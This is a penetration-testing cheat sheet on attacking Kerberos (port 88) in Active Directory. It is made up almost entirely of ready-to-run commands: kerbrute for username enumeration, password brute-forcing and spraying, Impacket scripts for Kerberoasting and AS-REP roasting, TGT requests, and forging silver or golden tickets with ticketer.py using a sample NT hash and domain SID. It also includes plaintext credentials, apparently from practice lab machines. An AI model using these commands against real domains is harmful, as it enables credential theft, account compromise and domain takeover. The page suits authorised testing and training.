---
id: kerberos
title: KERBEROS - 88
---

### Kerbrute
This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.

```bash
ntpdate ip.ip.ip.ip
```
##### userenum
```bash
kerbrute userenum --dc ip.ip.ip.ip -d domain.domain /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt
```
##### bruteuser
```bash
kerbrute bruteuser --dc ip.ip.ip.ip  -d domain.domain /usr/share/SecLists/Passwords/xato-net-10-million-passwords.txt usuario
```
##### passwordspray
```bash
kerbrute passwordspray COMPLETAR
```

### GetSID
https://www.netexec.wiki/ldap-protocol/find-domain-sid

```bash
nxc ldap sequel.htb -u rose -p 'KxEPkKe6R8su' --get-sid
```

### GetUserSPNs.py

https://books.spartan-cybersec.com/cpad/vulnerabilidades-y-ataques-en-ad/kerberoasting/utilizando-impacket-getuserspns

Queries target domain for SPNs that are running under a user account

##### ntlm
```bash
GetUserSPNs.py domain.domain/USER:Password
```

##### ntlm disabled
```bash
GetUserSPNs.py -k domain.domain/USER:Password -dc-host host.domain.domain
```

##### request 
```bash
GetUserSPNs.py domain.domain/USER:Password -request
```


Otra herramienta similar es: https://github.com/ShutdownRepo/targetedKerberoast


### mssqlclient.py
TDS client implementation (SSL supported).

```bash
mssqlclient.py scrm.local/sqlsvc:Pegasus60@scrm.local 
```


```bash
export KRB5CCNAME=ticketuser.ccache
```

```bash
mssqlclient.py host.domain.domain -k
```

### getTGT.py
Given a password, hash or aesKey, it will request a TGT and save it as ccache

```bash
getTGT.py domain.domain/USER:Password
```

### getPac.py

```bash
getPac.py domain.domain/USER:Password -targetUser user
```

### ticketer.py
Creates a Kerberos golden/silver tickets based on user options

```bash
ticketer.py -spn 'MSSQLSvc/dc1.scrm.local' -domain-sid 'S-1-5-21-2743207045-1827831105-2542523200' -nthash 'b999a16500b87d17ec7f2e2a68778f05' -dc-ip dc1.scrm.local -domain scrm.local Administrator
```

### GetNPUsers.py 
Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking

1. Get a TGT for a user:
```bash
GetNPUsers.py contoso.com/john.doe -no-pass
```
For this operation you don't need john.doe's password. It is important tho, to specify -no-pass in the script, 
otherwise a badpwdcount entry will be added to the user

2. Get a list of users with UF_DONT_REQUIRE_PREAUTH set
```bash
GetNPUsers.py contoso.com/emily:password
or
GetNPUsers.py contoso.com/emily
```
This will list all the users in the contoso.com domain that have UF_DONT_REQUIRE_PREAUTH set. 
However it will require you to have emily's password. (If you don't specify it, it will be asked by the script)

3. Request TGTs for all users
```bash
GetNPUsers.py contoso.com/emily:password -request 
or 
GetNPUsers.py contoso.com/emily
```

4. Request TGTs for users in a file
```bash
GetNPUsers.py -no-pass -usersfile users.txt contoso.com/
```
For this operation you don't need credentials.

